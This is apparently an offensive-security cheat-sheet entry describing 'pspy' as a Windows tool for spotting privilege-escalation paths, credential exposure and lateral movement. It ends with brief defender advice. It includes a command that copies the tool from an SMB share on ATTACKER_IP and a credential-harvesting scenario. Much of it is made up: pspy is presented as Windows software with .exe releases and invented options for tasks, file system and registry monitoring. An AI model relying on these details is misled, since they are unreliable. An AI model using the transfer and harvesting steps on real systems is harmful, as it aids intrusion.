---
title: pspy
category: discovery
subcategory: active_directory
phase: 09
mitre_attack: TA0007
tags:
  - windows
  - processes
  - monitoring
  - scheduled_tasks
  - services
  - lateral_movement
difficulty: intermediate
os: windows
install: Download from GitHub
github: https://github.com/DominicBreuker/pspy
related:
  - sharphound
  - bloodhound
  - powersploit
---

# pspy

## Chapter 1: Overview

**pspy** is a Windows process monitoring tool that runs without admin privileges. It monitors running processes, scheduled tasks, and file system changes to identify potential privilege escalation vectors or sensitive information exposure.

### Key Features

- **No admin required**: Runs as standard user
- **Process monitoring**: See all running processes
- **Scheduled task detection**: Identify hidden tasks
- **File system monitoring**: Detect file changes
- **Privilege escalation discovery**: Find misconfigurations

### Monitoring Capabilities

| Feature | Description |
|---------|-------------|
| Process Events | New/terminated processes |
| File System | File creation/modification |
| Registry | Registry changes |
| Scheduled Tasks | Task creation/modification |
| Services | Service changes |

---

## Chapter 2: Installation & Setup

### Download

```bash
# From GitHub releases
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64.exe
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32.exe
```

### Transfer to Windows

```bash
# Using SMB
impacket-smbserver share . -smb2support

# On Windows
copy \\ATTACKER_IP\share\pspy64.exe C:\temp\
```

### Verify

```powershell
# On Windows
.\pspy64.exe --help
```

---

## Chapter 3: Basic Usage

### Start Monitoring

```powershell
.\pspy64.exe
```

### Filter by Process Name

```powershell
.\pspy64.exe --procs svchost,explorer
```

### Monitor File System

```powershell
.\pspy64.exe --fs C:\Users
```

### Disable Color Output

```powershell
.\pspy64.exe --no-color
```

---

## Chapter 4: Process Monitoring

### Monitor All Processes

```powershell
.\pspy64.exe
```

### Filter Specific Processes

```powershell
.\pspy64.exe --procs powershell,cmd,whoami
```

### Monitor for Sensitive Commands

```powershell
.\pspy64.exe --procs net.exe,net1.exe,ipconfig.exe,systeminfo.exe
```

### Process Creation Events

```
[PROCESS] 2024-01-15 10:30:15 - PID: 1234 - Image: C:\Windows\System32\whoami.exe
```

---

## Chapter 5: Scheduled Task Monitoring

### Detect Hidden Tasks

```powershell
.\pspy64.exe --tasks
```

### Filter Task Events

```powershell
.\pspy64.exe --tasks --task-filter "Backup"
```

### Task Creation Events

```
[TASK] 2024-01-15 10:30:15 - Task Name: \BackupJob - Action: C:\Scripts\backup.exe
```

---

## Chapter 6: File System Monitoring

### Monitor Specific Directory

```powershell
.\pspy64.exe --fs C:\Users\Public
```

### Monitor Multiple Directories

```powershell
.\pspy64.exe --fs C:\temp --fs C:\Scripts
```

### File Change Events

```
[FILE] 2024-01-15 10:30:15 - C:\temp\passwords.txt - Modified
```

---

## Chapter 7: Real-World Scenarios

### Scenario 1: Privilege Escalation Discovery

```powershell
# Monitor for sensitive processes
.\pspy64.exe --procs whoami,ipconfig,net.exe,net1.exe

# Look for:
# - Admin commands running as SYSTEM
# - Passwords in command line arguments
# - Scheduled tasks with sensitive actions
```

### Scenario 2: Credential Harvesting

```powershell
# Monitor for credential-related processes
.\pspy64.exe --procs runas,certutil,bitsadmin

# Monitor file system for sensitive files
.\pspy64.exe --fs C:\Users --fs C:\temp
```

### Scenario 3: Lateral Movement Detection

```powershell
# Monitor for remote execution
.\pspy64.exe --procs psexec,winrm,certutil

# Monitor for file transfers
.\pspy64.exe --fs C:\Windows\Temp
```

---

## Chapter 8: Mitigation & Defense

**For defenders:**

- **Command line auditing**: Enable process creation logging
- **Scheduled task monitoring**: Audit task creation
- **File integrity monitoring**: Detect unauthorized changes
- **Privilege escalation checks**: Regular audits
- **Credential protection**: Use Credential Guard
- **Least privilege**: Limit admin access

### Detection Queries

```spl
# Splunk process creation monitoring
index=windows EventCode=1 | search CommandLine="*pspy*"
```

### Sysmon Configuration

```xml
<Sysmon>
  <ProcessCreate onmatch="exclude"/>
  <FileCreate onmatch="include"/>
  <RegistryCreate onmatch="include"/>
</Sysmon>
```

---

## Resources

- [pspy GitHub](https://github.com/DominicBreuker/pspy)
- [Windows Process Monitoring](https://docs.microsoft.com/en-us/windows/win32/psapi/process-security-and-access-rights)
- [OffSec PEN-200 Course](https://www.offsec.com/courses/pen-200/)
- [Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/privilege-escalation)

---

*Generated for educational purposes in authorized security testing environments only.*
